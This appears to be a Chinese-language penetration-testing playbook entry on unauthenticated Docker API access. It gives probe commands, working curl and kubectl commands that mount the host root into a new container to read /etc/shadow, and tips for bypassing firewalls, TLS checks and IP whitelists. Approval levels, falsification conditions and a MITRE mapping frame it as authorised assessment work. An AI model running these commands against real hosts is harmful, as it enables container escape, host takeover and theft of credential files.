---
source: manual
confidence: high
platforms: [docker]
required_tools: []
execution_contexts: [L0, L1]
max_verification_level: L1
destructive: false
mapped_attack_surfaces: [AS-2.4]
mapped_compliance_families: [Docker守护进程参数]
---

# Docker API 未认证访问

## 1. 前置条件

- Docker daemon 监听 TCP 端口（2375/2376）且无 TLS 或认证
- Docker socket `/var/run/docker.sock` 被挂载到容器内且可读写
- 容器内可以访问宿主机的 Docker API

## 2. 探测命令

- [L0] `docker port` 或 `ss -tlnp | grep -E '2375|2376'` → 期望：发现 Docker TCP 端口监听
- [L0] `ps aux | grep dockerd | grep -o '\-H [^ ]*'` → 期望：发现 `-H tcp://0.0.0.0:2375` 或类似配置
- [L0] `cat /etc/docker/daemon.json` → 期望：发现 `"hosts": ["tcp://0.0.0.0:2375"]` 配置
- [L0] `curl -sk http://<docker-host>:2375/version` → 期望：返回 Docker 版本信息（无认证）
- [L0] `curl -sk http://<docker-host>:2375/containers/json` → 期望：返回运行中的容器列表（无认证）
- [L1] 容器内: `ls -la /var/run/docker.sock` → 期望：文件存在且权限含 rw
- [L1] 容器内: `docker -H unix:///var/run/docker.sock ps` → 期望：返回容器列表（docker.sock 可用）

## 3. 攻击验证

- [L1] 通过未认证 API 创建临时容器验证逃逸路径：
  `curl -sk -X POST http://<docker-host>:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["ls","/host/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}'` → 期望：返回容器 ID
- [L1] 启动容器并读取结果：
  `curl -sk -X POST http://<docker-host>:2375/containers/<container-id>/start` → 期望：容器启动成功
- [L1] 若容器内存在 docker.sock：
  `kubectl exec <pod> -- docker run -v /:/host alpine ls /host/etc/shadow` → 期望：可读取宿主机文件

## 4. 差分证明

- 攻击前 [L0]: `docker ps` 仅显示预期容器
- 攻击后 [L0]: `docker ps` 出现通过未认证 API 创建的临时容器
- 攻击前 [L1]: 容器内无法读取宿主机 `/etc/shadow`
- 攻击后 [L1]: 通过 Docker API 创建的容器可挂载宿主机根目录并读取敏感文件

## 5. 绕过策略

- 若 2375 端口被防火墙阻止：尝试通过 docker.sock 挂载路径（容器内挂载点搜索）
- 若 TLS 要求客户端证书：检查是否有自签名证书可被绕过（`curl -sk` 跳过验证）
- 若 Docker API 有 IP 白名单：从 Pod 网络内发起请求绕过白名单
- 若容器内无 docker 客户端：使用 curl 直接构造 Docker Engine API 请求

## 6. 证伪条件

- [L0] Docker 仅监听 unix socket（`-H fd://` 或无 `-H tcp`）→ 证伪
- [L0] Docker TCP 端口不可达（`curl` 超时或连接拒绝）→ 证伪
- [L0] Docker API 返回 401/403（认证/TLS 启用）→ 证伪
- [L1] 容器内 `/var/run/docker.sock` 不存在或无读写权限 → 证伪

## 7. 审批级别

Level 2：探测命令（curl/nc 访问 Docker API）自动通过。
Level 3：创建临时容器验证逃逸路径需确认。
destructive: false（创建的临时容器在验证后清理）

## 8. MITRE ATT&CK

T1190 - Exploit Public-Facing Application（利用 Docker API 未认证访问实现容器逃逸）